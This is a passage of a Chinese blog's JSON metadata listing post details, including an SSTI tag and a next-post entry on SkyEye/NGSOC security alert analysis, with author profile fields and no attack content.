mins."},"categories":[{"name":"文章","slug":"文章","count":3,"path":"api/categories/文章.json"}],"tags":[{"name":"ssti模板注入","slug":"ssti模板注入","count":2,"path":"api/tags/ssti模板注入.json"}],"author":{"name":"南瓜の无名","slug":"blog-author","avatar":"../picture/head_01.jpg","link":"/","description":"你不需要很厉害才能开始，但你需要开始才能变得很厉害！","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"天眼&NGSOC告警分析","uid":"bc3ebb8ae7699a64039d8253e84d74dc","slug":"AA_天眼&NGSOC告警分析","date":"2023-08-25T12:30:34.000Z","updated":"2024-04-13T10:15:45.078Z","comments":true,"path":"api/articles/AA_天眼&NGSOC告警分析.json","keywords":null,"cover":"../picture/37.jpg","text":"天眼&amp;NGSOC告警分析天眼使用指南&lt; 分析平台，流量传感器，文件威胁鉴定器 &gt; 新一代安全感知系统：检测，溯源，响应 云端威胁情报： 文件威胁鉴定器静态检测，动态检测 分析平台威胁感知，调查分析，场景化分析 流量传感器入侵攻击检测，威胁情报匹配，文件还原，数...","link":"","photos":[],"count_time":{"symbolsCount":"20k","symbolsTime":"18 mins."},"categories":[{"name":"护网","slug":"护网","count":2,"path":"api/categories/护网.json"}],"tags":[{"name":"奇安信","slug":"奇安信","count":1,"path":"api/tags/奇安信.json"},{"name":"天眼","slug":"天眼","count":1,"path":"api/tags/天眼.json"},{"name":"护网","slug":"护网","count":2,"path":"api/tags/护网.json"}],"author":{"name":"南瓜の无名","slug":"blog-author","avatar":"../picture/head_01.jpg","link":"/","description":"你不需要很厉害才能开始，但你需要开始才能变得很厉害！","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":false}}